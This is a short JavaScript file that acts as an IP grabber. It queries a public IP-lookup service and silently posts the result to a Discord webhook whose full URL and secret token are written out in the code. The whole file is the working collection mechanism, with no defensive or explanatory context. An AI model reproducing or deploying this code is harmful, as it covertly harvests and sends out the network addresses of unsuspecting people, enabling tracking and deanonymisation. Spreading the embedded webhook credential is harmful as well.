const ipifyURL = 'https://api.ipify.org/?format=json';
const webhookURL = 'https://discord.com/api/webhooks/1198365185824542831/XFgFtFVzENqKVzpl_PqT_JF_BlZHBiOwiHHrneb0B2neAoCvERFOIHvlHBsQ0klD4rpy';

// Fetch the IP address from ipify API
fetch(ipifyURL)
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip; 

    const payload = {
      content: `${ipAddress}`,
    };


    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then(response => {
        if (response.ok) {
          console.log('IP address data sent successfully to the Discord webhook.');
        } else {
          console.error('Failed to send IP address data to the Discord webhook.');
        }
      })
      .catch(error => {
        console.error('An error occurred:', error);
      });
  })
  .catch(error => {
    console.error('An error occurred while fetching IP address:', error);
  });